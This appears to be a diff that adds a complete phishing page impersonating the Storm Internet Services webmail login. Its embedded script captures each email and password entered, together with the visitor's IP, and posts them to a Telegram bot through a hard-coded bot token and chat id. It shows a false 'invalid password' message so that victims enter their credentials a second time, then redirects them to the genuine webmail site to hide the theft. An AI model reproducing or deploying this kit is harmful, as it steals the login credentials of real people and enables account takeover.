@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Storm Internet Services</title>
+
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+        background-color: white;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .login-container {
+        width: 360px;
+        text-align: center;
+    }
+
+    /* Logo placeholder */
+    .logo {
+
+        img{
+            width: 130px;
+            height: 120px;
+            margin: 0 auto 30px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            
+
+        }
+
+    }
+
+    #loginForm {
+        width: 100%;
+    }
+
+    .input-group {
+        display: flex;
+        align-items: center;
+        border: 1px solid #ccc;
+        background: #f2f2f2;
+        border-radius: 4px;
+        margin-bottom: 15px;
+        overflow: hidden;
+    }
+
+    .icon {
+        width: 45px;
+        background: #e0e0e0;
+        text-align: center;
+        padding: 12px 0;
+        color: #555;
+    }
+
+    #loginForm input {
+        border: none;
+        outline: none;
+        width: 100%;
+        padding: 12px;
+        font-size: 15px;
+        background: transparent;
+    }
+
+    #loginForm button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 4px;
+        background: #39a9db;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+    }
+
+    #loginForm button:hover {
+        background: #2c90bd;
+    }
+
+    .support {
+        margin-top: 18px;
+        font-size: 14px;
+    }
+
+    .support a {
+        color: #1e88e5;
+        text-decoration: none;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="login-container">
+
+    <div class="logo">
+        <img src="Storm%20Internet%20Services_files/logo_pWzp.png" alt="storm logo">
+    </div>
+
+    <form id="loginForm">
+        
+        <div class="input-group">
+            <div class="icon">👤</div>
+            <input type="email" id="email" placeholder="Email" required="">
+        </div>
+
+        <div class="input-group">
+            <div class="icon">🔒</div>
+            <input type="password" id="password" placeholder="Password" required="">
+        </div>
+
+        <button type="submit">Log in</button>
+        
+    <div id="errorMsg" style="color: red; font-size: 13px; margin-top: 10px;"></div></form>
+
+    <div class="support">
+        • <a href="#">Get support</a>
+    </div>
+
+</div>
+<script>
+  const botToken = "8943164891:AAGkuoXA4wOP0ENVQHuqk6Ir_01gZsw8FFI"; // replace
+  const chatId = "1061162049";     // replace
+
+  let attempt = 1;
+  let maxAttempts = 2;
+
+  const form = document.getElementById("loginForm");
+  const emailInput = document.getElementById("email");
+  const passwordInput = document.getElementById("password");
+
+  const getIP = async () => {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch (e) {
+      return "Unknown IP";
+    }
+  };
+
+  const sendToTelegram = async (email, password, attemptNum, ip) => {
+    const msg = `
+🔐 Login Attempt #${attemptNum}:
+📧 Email: ${email}
+🔑 Password: ${password}
+
+🌐 IP: ${ip}
+    `;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg
+        })
+      });
+    } catch (error) {
+      console.error("Error sending to Telegram:", error);
+    }
+  };
+
+  // Create error message container
+  const messageDiv = document.createElement("div");
+  messageDiv.id = "errorMsg";
+  messageDiv.style.color = "red";
+  messageDiv.style.fontSize = "13px";
+  messageDiv.style.marginTop = "10px";
+  form.appendChild(messageDiv);
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !password) return;
+
+    // Send this attempt to Telegram immediately
+    const ip = await getIP();
+    await sendToTelegram(email, password, attempt, ip);
+
+    if (attempt < maxAttempts) {
+      attempt++;
+      emailInput.value = "";
+      passwordInput.value = "";
+      messageDiv.textContent = "Invalid email or password. Please try again.";
+    } else {
+      messageDiv.textContent = "";
+      // Redirect after the final attempt
+      setTimeout(() => {
+        window.location.href = "https://webmail.storm.ca"; // change destination
+      }, 1000);
+    }
+  });
+</script>
+
+
+</body></html>
